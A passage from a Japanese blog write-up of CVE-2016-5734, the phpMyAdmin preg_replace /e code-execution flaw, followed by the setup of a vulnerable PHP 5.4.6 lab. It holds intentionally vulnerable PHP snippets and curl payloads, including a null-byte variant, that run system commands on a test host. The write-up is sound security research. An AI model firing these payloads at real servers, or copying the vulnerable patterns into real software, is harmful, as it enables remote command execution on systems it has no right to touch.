<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>CVE-2016-5734 phpMyAdminに任意のコマンドの実行可能な脆弱性</title>
  <meta name="description" content="概要">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://kosukeshimofuji.jp/2016/07/19/CVE-2016-5734/">
  <link rel="alternate" type="application/rss+xml" title="Kosuke Shimofuji's Home Page" href="https://kosukeshimofuji.jp/feed.xml">
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-80482518-1', 'auto');
  ga('send', 'pageview');

</script>

      <meta property="og:url" content="https://kosukeshimofuji.jp/2016/07/19/CVE-2016-5734/" />
  
    <meta property="og:type" content="article" />
    <meta property="og:title" content="CVE-2016-5734 phpMyAdminに任意のコマンドの実行可能な脆弱性 | Kosuke Shimofuji's Home Page" />
  


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Kosuke Shimofuji's Home Page</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
          <a class="page-link" href="/links/">Links</a>
          
        
          
        
      </div>
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <p class="post-meta">Posted date: <time datetime="2016-07-19T00:00:00+09:00"
        itemprop="datePublished">2016-07-19 00:00:00 +0900</time></p>
    <h1 class="post-title" itemprop="name headline">CVE-2016-5734 phpMyAdminに任意のコマンドの実行可能な脆弱性</h1>
  </header>

  
    <h2>Table of contents</h2>
  
  
  <div class="post-content" itemprop="articleBody">
  <ul class="section-nav">
<li class="toc-entry toc-h1"><a href="#概要">概要</a></li>
<li class="toc-entry toc-h1"><a href="#cvss-v3">CVSS v3</a></li>
<li class="toc-entry toc-h1"><a href="#解決策緩和策情報">解決策、緩和策情報</a></li>
<li class="toc-entry toc-h1"><a href="#影響を受けるphpmyadminのバージョン">影響を受けるphpMyAdminのバージョン</a></li>
<li class="toc-entry toc-h1"><a href="#技術的な詳細">技術的な詳細</a></li>
<li class="toc-entry toc-h2"><a href="#前提知識">前提知識</a></li>
<li class="toc-entry toc-h2"><a href="#検証環境構築">検証環境構築</a></li>
<li class="toc-entry toc-h3"><a href="#vagrnt-snapshotの導入">vagrnt snapshotの導入</a></li>
<li class="toc-entry toc-h4"><a href="#apacheとphpとmysql環境の構築">ApacheとPHPとMySQL環境の構築</a></li>
<li class="toc-entry toc-h3"><a href="#xdebugで調査">Xdebugで調査</a></li>
<li class="toc-entry toc-h3"><a href="#phpmyadmin-401015のインストール">phpMyAdmin 4.0.10.15のインストール</a></li>
<li class="toc-entry toc-h2"><a href="#phpmyadmin44156のインストール">phpMyAdmin4.4.15.6のインストール</a></li>
<li class="toc-entry toc-h2"><a href="#phpmyadmin462のインストール">phpMyAdmin4.6.2のインストール</a></li>
<li class="toc-entry toc-h2"><a href="#snapshotの作成">snapshotの作成</a></li>
<li class="toc-entry toc-h2"><a href="#phpmyadmin401015に関わる技術的な調査">phpMyAdmin4.0.10.15に関わる技術的な調査</a></li>
<li class="toc-entry toc-h3"><a href="#phpmyadmin44156に関わる技術的な調査">phpMyAdmin4.4.15.6に関わる技術的な調査</a></li>
<li class="toc-entry toc-h3"><a href="#概念実証">概念実証</a></li>
<li class="toc-entry toc-h2"><a href="#phpmyadmin462に関わる技術的な調査">phpMyAdmin4.6.2に関わる技術的な調査</a></li>
<li class="toc-entry toc-h1"><a href="#まとめ">まとめ</a></li>
<li class="toc-entry toc-h1"><a href="#得られた知見">得られた知見</a></li>
<li class="toc-entry toc-h1"><a href="#得られた疑問">得られた疑問</a></li>
<li class="toc-entry toc-h1"><a href="#情報源">情報源</a></li>
</ul><h1 id="section">
<a id="概要" class="anchor" href="#%E6%A6%82%E8%A6%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>概要</h1>

<p>phpMyAdminの4.0系の4.0.10.16未満、4.4系の4.4.15.7未満、4.6系の4.6.3未満のバージョンにはpreg_replaceの<a href="http://php.net/manual/ja/regexp.reference.delimiters.php">デリミタ</a>を適切に選択しないため、攻撃者はリモートから任意のコマンドのPHPコードを注入することができます。これはテーブルの検索と置換の実装に起因します。</p>

<h1 id="cvss-v3">
<a id="cvss-v3" class="anchor" href="#cvss-v3" aria-hidden="true"><span class="octicon octicon-link"></span></a>CVSS v3</h1>

<table>
  <tbody>
    <tr>
      <td>CVSS v3 Base Score</td>
      <td>9.8 Critical</td>
    </tr>
    <tr>
      <td>Vector</td>
      <td>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</td>
    </tr>
    <tr>
      <td>Impact Score</td>
      <td>5.9</td>
    </tr>
    <tr>
      <td>Exploitability Score</td>
      <td>3.9</td>
    </tr>
    <tr>
      <td>Attack Vector (AV)</td>
      <td>Network</td>
    </tr>
    <tr>
      <td>Attack Complexity (AC)</td>
      <td>Low</td>
    </tr>
    <tr>
      <td>Privileges Required (PR)</td>
      <td>None</td>
    </tr>
    <tr>
      <td>User Interaction (UI)</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Scope (S)</td>
      <td>Unchanged</td>
    </tr>
    <tr>
      <td>Confidentiality (C)</td>
      <td>High</td>
    </tr>
    <tr>
      <td>Integrity (I)</td>
      <td>High</td>
    </tr>
    <tr>
      <td>Availability (A)</td>
      <td>High</td>
    </tr>
  </tbody>
</table>

<h1 id="section-1">
<a id="解決策緩和策情報" class="anchor" href="#%E8%A7%A3%E6%B1%BA%E7%AD%96%E7%B7%A9%E5%92%8C%E7%AD%96%E6%83%85%E5%A0%B1" aria-hidden="true"><span class="octicon octicon-link"></span></a>解決策、緩和策情報</h1>

<p>phpMyAdminのバージョンを4.6.3, 4.4.15.7, 4.0.10.16以上にアップグレードするか、以下のパッチを適用してください。</p>

<ul>
  <li>4.0系
    <ul>
      <li><a href="https://github.com/phpmyadmin/phpmyadmin/commit/351019c">351019c</a></li>
    </ul>
  </li>
  <li>4.4系
    <ul>
      <li><a href="https://github.com/phpmyadmin/phpmyadmin/commit/33d1373">33d1373</a></li>
      <li><a href="https://github.com/phpmyadmin/phpmyadmin/commit/daf3751">daf3751</a></li>
    </ul>
  </li>
  <li>4.6系
    <ul>
      <li><a href="https://github.com/phpmyadmin/phpmyadmin/commit/4bcc606">4bcc606</a></li>
      <li><a href="https://github.com/phpmyadmin/phpmyadmin/commit/1cc7466">1cc7466</a></li>
    </ul>
  </li>
</ul>

<h1 id="phpmyadmin">
<a id="影響を受けるphpmyadminのバージョン" class="anchor" href="#%E5%BD%B1%E9%9F%BF%E3%82%92%E5%8F%97%E3%81%91%E3%82%8Bphpmyadmin%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3" aria-hidden="true"><span class="octicon octicon-link"></span></a>影響を受けるphpMyAdminのバージョン</h1>

<ul>
  <li>4.0系
    <ul>
      <li>4.0.10.15</li>
      <li>4.0.9</li>
      <li>4.0.8</li>
      <li>4.0.7</li>
      <li>4.0.6</li>
      <li>4.0.5</li>
      <li>4.0.4.2</li>
      <li>4.0.4.1</li>
      <li>4.0.4</li>
      <li>4.0.3</li>
      <li>4.0.2</li>
      <li>4.0.10.9</li>
      <li>4.0.10.8</li>
      <li>4.0.10.7</li>
      <li>4.0.10.6</li>
      <li>4.0.10.5</li>
      <li>4.0.10.4</li>
      <li>4.0.10.3</li>
      <li>4.0.10.2</li>
      <li>4.0.10.14</li>
      <li>4.0.10.13</li>
      <li>4.0.10.12</li>
      <li>4.0.10.11</li>
      <li>4.0.10.10</li>
      <li>4.0.10.1</li>
      <li>4.0.10</li>
      <li>4.0.1</li>
      <li>4.0.0</li>
    </ul>
  </li>
  <li>4.4系
    <ul>
      <li>4.4.15.6</li>
      <li>4.4.15.5</li>
      <li>4.4.9</li>
      <li>4.4.8</li>
      <li>4.4.7</li>
      <li>4.4.6.1</li>
      <li>4.4.6</li>
      <li>4.4.5</li>
      <li>4.4.4</li>
      <li>4.4.3</li>
      <li>4.4.2</li>
      <li>4.4.15.4</li>
      <li>4.4.15.3</li>
      <li>4.4.15.2</li>
      <li>4.4.15.1</li>
      <li>4.4.15</li>
      <li>4.4.14.1</li>
      <li>4.4.13.1</li>
      <li>4.4.13</li>
      <li>4.4.12</li>
      <li>4.4.11</li>
      <li>4.4.10</li>
      <li>4.4.1.1</li>
      <li>4.4.1</li>
      <li>4.4.0</li>
    </ul>
  </li>
  <li>4.6系
    <ul>
      <li>4.6.0:rc2</li>
      <li>4.6.0:rc1</li>
      <li>4.6.0:alpha1</li>
      <li>4.6.2</li>
      <li>4.6.1</li>
      <li>4.6.0</li>
    </ul>
  </li>
</ul>

<h1 id="section-2">
<a id="技術的な詳細" class="anchor" href="#%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E8%A9%B3%E7%B4%B0" aria-hidden="true"><span class="octicon octicon-link"></span></a>技術的な詳細</h1>

<h2 id="section-3">
<a id="前提知識" class="anchor" href="#%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AD%98" aria-hidden="true"><span class="octicon octicon-link"></span></a>前提知識</h2>

<p>evalのような文字列を再評価処理を行う関数に外部から汚染可能な値を渡すと任意のコマンドの実行が可能な脆弱性ができてしまいます。</p>

<ul>
  <li>外部入力を無害化することなしに再評価処理する脆弱なスクリプト</li>
</ul>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nx">eva</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<ul>
  <li>任意のコマンドの実行が可能</li>
</ul>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>curl -X GET <span class="s2">"http://vlun.test/test.php?input=system('hostname');"</span>
vlun.test
</code></pre>
</div>

<p>再評価といえばevalですが、正規表現と置換処理を担うpreg_replace関数もeオプションを使用することで文字列再評価を行う機能を持っています。この機能はphp 5.5.0で非推奨の機能となり、php 7.0.0で使えなくなっています。またphp 5.5.0以降ではE_DEPRECATEDの例外が発生し、PHP 7.0.0以降ではE_WARNINGの例外が発生します。また、php 5.4.6まではpreg_replaceにNULL終端攻撃を実行することが可能です。</p>

<ul>
  <li>外部入力を無害化することなしに再評価処理する脆弱なスクリプト</li>
</ul>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/.*/e'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input'</span><span class="p">],</span> <span class="s1">''</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<ul>
  <li>任意のコマンドの実行が可能</li>
</ul>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>curl -X GET <span class="s2">"http://vlun.test/test.php?input=system('hostname');"</span>
vlun.test
</code></pre>
</div>

<p>次は本件の脆弱性で問題になっている<a href="http://php.net/manual/ja/regexp.reference.delimiters.php">デリミタ</a>に着目してpreg_replaceの再評価処理をみていきましょう。</p>

<ul>
  <li>正規表現パターンと置き換え文字列を外部入力から渡す</li>
</ul>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input1'</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input2'</span><span class="p">],</span> <span class="s1">''</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<ul>
  <li>任意のコマンドの実行が可能</li>
</ul>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>curl -X GET <span class="s2">"http://vlun.test/test.php?input1=/.*/e&amp;input2=system('uname+-a');"</span>
Linux vlun.test 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt25-2+deb8u3 (2016-07-02) x86_64 GNU/Linux</span>
</code></pre>
</div>

<p>正規表現の完全なパターン渡して任意のコマンドの実行を起こすことが可能なのがわかりました。
次に一部だけ正規表現が定義されている場合をみてみましょう。</p>

<ul>
  <li>デリミタを @ で設定し、前半のデリミタだけを指定する</li>
</ul>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'@'</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input1'</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input2'</span><span class="p">],</span> <span class="s1">''</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<ul>
  <li>後半のデリミタとeオプションを設定して、任意のコマンドの実行を行う</li>
</ul>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>curl -X GET <span class="s2">"http://vlun.test/test.php?input1=.*@e&amp;input2=system('uname+-a');"</span>
Linux vlun.test 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt25-2+deb8u3 (2016-07-02) x86_64 GNU/Linux</span>
</code></pre>
</div>

<ul>
  <li>デリミタが始点と終点も支持されている</li>
</ul>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'@'</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input1'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'@'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input2'</span><span class="p">],</span> <span class="s1">''</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<ul>
  <li>NULL終端文字列を渡して、終点のデリミタを無効にする。</li>
</ul>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>curl -X GET <span class="s2">"http://vlun.test/test.php?input1=.*@e%00&amp;input2=system('uname+-a');"</span>
Linux vlun.test 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux</span>
</code></pre>
</div>

<p>前途の通り、NULL終端攻撃はPHP 5.4.6以前しか使うことはできません。</p>

<p>第３パラメータはどのような値が入っていても任意のコマンドは実行します。</p>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'@'</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input1'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'@'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input2'</span><span class="p">],</span> <span class="s1">'XXX'</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>curl -X GET <span class="s2">"http://vlun.test/test.php?input1=.*@e%00&amp;input2=system('uname+-a');"</span>

Linux vlun.test 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux</span>
Linux vlun.test 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux</span>
</code></pre>
</div>

<p>POSTの例も見ておきましょう。</p>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'@'</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'input1'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'@'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'input2'</span><span class="p">],</span> <span class="s1">'XXX'</span><span class="p">)</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang =</span><span class="err"> </span><span class="s">“ja”</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset =</span><span class="err"> </span><span class="s">“UFT-8”</span><span class="nt">&gt;</span>
<span class="nt">&lt;title&gt;</span>post test<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h1&gt;</span>post test<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action =</span><span class="err"> </span><span class="s">"test.php"</span> <span class="na">method =</span><span class="err"> </span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type =</span><span class="err"> </span><span class="s">"text"</span> <span class="na">name =</span><span class="s">"input1"</span><span class="nt">&gt;&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type =</span><span class="err"> </span><span class="s">"text"</span> <span class="na">name =</span><span class="s">"input2"</span><span class="nt">&gt;&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type =</span><span class="err"> </span><span class="s">"submit"</span> <span class="na">value =</span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre>
</div>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ curl -d 'input1=.*%40e%00<span class="err">&amp;</span>input2=system%28%27hostname%27%29%3B' http://vlun.test/test.php

vlun.test
vlun.test

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang =</span><span class="err"> </span><span class="s">“ja”</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset =</span><span class="err"> </span><span class="s">“UFT-8”</span><span class="nt">&gt;</span>
<span class="nt">&lt;title&gt;</span>post test<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h1&gt;</span>post test<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action =</span><span class="err"> </span><span class="s">"test.php"</span> <span class="na">method =</span><span class="err"> </span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type =</span><span class="err"> </span><span class="s">"text"</span> <span class="na">name =</span><span class="s">"input1"</span><span class="nt">&gt;&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type =</span><span class="err"> </span><span class="s">"text"</span> <span class="na">name =</span><span class="s">"input2"</span><span class="nt">&gt;&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type =</span><span class="err"> </span><span class="s">"submit"</span> <span class="na">value =</span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre>
</div>

<h2 id="section-4">
<a id="検証環境構築" class="anchor" href="#%E6%A4%9C%E8%A8%BC%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89" aria-hidden="true"><span class="octicon octicon-link"></span></a>検証環境構築</h2>

<h3 id="vagrnt-snapshot">
<a id="vagrnt-snapshotの導入" class="anchor" href="#vagrnt-snapshot%E3%81%AE%E5%B0%8E%E5%85%A5" aria-hidden="true"><span class="octicon octicon-link"></span></a>vagrnt snapshotの導入</h3>

<p>検証環境はvagrantで構築しています。環境をよく壊してしまいますので、vagrantでsnapshotをとっておいて不測の事態に備えます。
使い方は<a href="http://qiita.com/takuan_osho/items/682b776b41989f0b016f">takuan_oshoさんのqiita</a>を参考にしました。</p>

<h4 id="apachephpmysql">
<a id="apacheとphpとmysql環境の構築" class="anchor" href="#apache%E3%81%A8php%E3%81%A8mysql%E7%92%B0%E5%A2%83%E3%81%AE%E6%A7%8B%E7%AF%89" aria-hidden="true"><span class="octicon octicon-link"></span></a>ApacheとPHPとMySQL環境の構築</h4>

<p>phpMyAdminの4.0.10.15を検証対象として、検証環境を構築します。
phpMyAdminの検証にはLAMP環境(Apache,MySQL,PHP)が必要です。また今回の脆弱性はNULL終端攻撃ができるVersionのPHPのほうが攻撃しやすそうなので、PHPはバージョン5.4.6以下を使います。
<a href="http://php.net/manual/ja/install.unix.apache2.php">PHPの公式</a>ページと<a href="http://qiita.com/ksugawara61/items/70f5d1faf192c4ba6ca0">ksugawara61さんのqiita</a>を参考に環境を構築していきます。</p>

<ul>
  <li>APR(Apache Protable Runtime)のインストール</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ wget http://ftp.yz.yamagata-u.ac.jp/pub/network/apache//apr/apr-1.5.2.tar.gz
$ tar zxvf apr-1.5.2.tar.gz
$ cd apr-1.5.2
$ ./configure --prefix=/opt/apr-1.5.2
$ make
$ sudo make install
</code></pre>
</div>

<ul>
  <li>APR-Utilのインストール</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ wget http://ftp.yz.yamagata-u.ac.jp/pub/network/apache//apr/apr-util-1.5.4.tar.gz
$ tar zxvf apr-util-1.5.4.tar.gz
$ cd apr-util-1.5.4
$ ./configure --prefix=/opt/apr-util-1.5.4 --with-apr=/opt/apr-1.5.2
$ make
$ sudo make install
</code></pre>
</div>

<ul>
  <li>PCRE(Perl Compatible Regular Expressions)のインストール</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ wget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.39.tar.gz
$ tar zxvf pcre-8.39.tar.gz
$ cd pcre-8.39
$ ./configure --prefix=/opt/pcre-8.37
$ make
$ sudo make install
</code></pre>
</div>

<ul>
  <li>Apacheのインストール</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ wget http://ftp.tsukuba.wide.ad.jp/software/apache//httpd/httpd-2.4.23.tar.gz
$ tar zxvf httpd-2.4.23.tar.gz
$ cd httpd-2.4.23
$ ./configure --with-apr=/opt/apr-1.5.2 --with-apr-util=/opt/apr-util-1.5.4 --with-pcre=/opt/pcre-8.37
$ make
$ sudo make install
$ /usr/local/apache2/bin/httpd -v
Server version: Apache/2.4.23 (Unix)
Server built:   Jul 14 2016 12:52:16
</code></pre>
</div>

<ul>
  <li>PHP5.4.6</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ sudo apt-get install libxml2-dev
$ wget http://museum.php.net/php5/php-5.4.6.tar.gz
$ tar zxvf php-5.4.6.tar.gz
$ cd php-5.4.6
$ ./configure --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql --enable-mbstring --enable-embedded-mysqli
$ make
</code></pre>
</div>

<p>以下のエラーが発生しました。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>/home/kosuke/php-5.4.6/ext/dom/node.c: In function ‘dom_canonicalization’:
/home/kosuke/php-5.4.6/ext/dom/node.c:1898:21: error: dereferencing pointer to incomplete type
    ret = buf-&gt;buffer-&gt;use;
                     ^
In file included from /home/kosuke/php-5.4.6/main/php.h:38:0,
                 from /home/kosuke/php-5.4.6/ext/dom/node.c:26:
/home/kosuke/php-5.4.6/ext/dom/node.c:1900:40: error: dereferencing pointer to incomplete type
     RETVAL_STRINGL((char *) buf-&gt;buffer-&gt;content, ret, 1);
                                        ^
/home/kosuke/php-5.4.6/Zend/zend_API.h:571:20: note: in definition of macro ‘ZVAL_STRINGL’
   const char *__s=(s); int __l=l;   \
                    ^
/home/kosuke/php-5.4.6/ext/dom/node.c:1900:5: note: in expansion of macro ‘RETVAL_STRINGL’
     RETVAL_STRINGL((char *) buf-&gt;buffer-&gt;content, ret, 1);
     ^
Makefile:575: recipe for target 'ext/dom/node.lo' failed
make: *** [ext/dom/node.lo] Error 1
</code></pre>
</div>

<p><a href="https://github.com/phpbrew/phpbrew/issues/249">githubのissuel</a>により、以下のパッチで改善されることを確認しました。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ curl -s https://mail.gnome.org/archives/xml/2012-August/txtbgxGXAvz4N.txt | patch -p0
$ make
$ sudo make install
$ php --version
PHP 5.4.6 (cli) (built: Jul 14 2016 14:08:12)
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.4.0, Copyright (c) 1998-2012 Zend Technologies
$ sudo cp php.ini-development /usr/local/lib/php.ini
</code></pre>
</div>

<p>ApacheからPHPを使うために/usr/local/apache2/conf/httpd.confに以下の設定を追加します。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>LoadModule php5_module        modules/libphp5.so
</code></pre>
</div>

<div class="highlighter-rouge">
<pre class="highlight"><code>&lt;FilesMatch \.php$&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
</div>

<p>MySQLはVersionを特に考える必要はないので、aptで入れました。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ sudo apt-get install mysql-server
</code></pre>
</div>

<h3 id="xdebug">
<a id="xdebugで調査" class="anchor" href="#xdebug%E3%81%A7%E8%AA%BF%E6%9F%BB" aria-hidden="true"><span class="octicon octicon-link"></span></a>Xdebugで調査</h3>

<p>tracelogを得られば問題の該当箇所を素早く見つけられると思うので、xdebugを導入してtracelogを得ます。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ sudo apt-get install autoconf
$ pecl install xdebug
(snip)
Build process completed successfully
Installing '/usr/local/lib/php/extensions/no-debug-zts-20100525/xdebug.so'
install ok: channel://pecl.php.net/xdebug-2.4.0
configuration option "php_ini" is not set to php.ini location
You should add "zend_extension_ts=xdebug.so" to php.ini
</code></pre>
</div>

<p>php.iniにxdebugの設定を書き込み、xdebugが有効になっていることを確認しました。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ cat &gt; /usr/local/lib/php.ini
zend_extension=/usr/local/lib/php/extensions/no-debug-zts-20100525/xdebug.so
auto_prepend_file = /usr/local/apache2/htdocs/prepend.php
auto_append_file = /usr/local/apache2/htdocs/append.php
xdebug.collect_return = 1
xdebug.collect_params = 4
xdebug.collect_assignments = 1
xdebug.var_display_max_data = 100000
xdebug.var_display_max_depth = 100000
xdebug.trace_format = 1
memory_limit = 256M
CTRL+C
$ php -i | grep xdebug | head
xdebug support =&gt; enabled
</code></pre>
</div>

<p>任意のファイルにtracelogを書き出すために、実行前と実行後に処理を行うphpスクリプトを作成します。</p>

<ul>
  <li>prepend.php</li>
</ul>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$VLUN_TEST_TRACELOG_DIR</span> <span class="o">=</span> <span class="s2">"/tmp/tracelog/"</span><span class="p">;</span>
<span class="nv">$VLUN_TEST_EXEC_FILENAME</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">]);</span>
<span class="nv">$VLUN_TEST_TIME</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
<span class="nv">$VLUN_TRACE_FILEPATH</span> <span class="o">=</span> <span class="s2">"${VLUN_TEST_TRACELOG_DIR}/${VLUN_TEST_EXEC_FILENAME}_${VLUN_TEST_TIME}"</span><span class="p">;</span>
<span class="nx">xdebug_start_trace</span><span class="p">(</span> <span class="nv">$VLUN_TRACE_FILEPATH</span> <span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<ul>
  <li>append.php</li>
</ul>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nx">xdebug_stop_trace</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</code></pre>
</div>

<p>この時にphpinfo.phpにアクセスすると/tmp/tracelog/phpinfo.php_1468546417.xtが生成されます。</p>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">root@vlun:/usr/local/apache2/htdocs# </span>cat /tmp/tracelog/phpinfo.php_1468546417.xt
Version: 2.4.0
File format: 4
TRACE START <span class="o">[</span>2016-07-15 01:33:37]
2       3       1       0.000155        235160
1       0       1       0.000164        235096
1       4       0       0.000190        233368  <span class="o">{</span>main<span class="o">}</span>  1               /usr/local/apache2/htdocs/phpinfo.php   0       0
2       5       0       0.000199        233448  phpinfo 0               /usr/local/apache2/htdocs/phpinfo.php   2       0
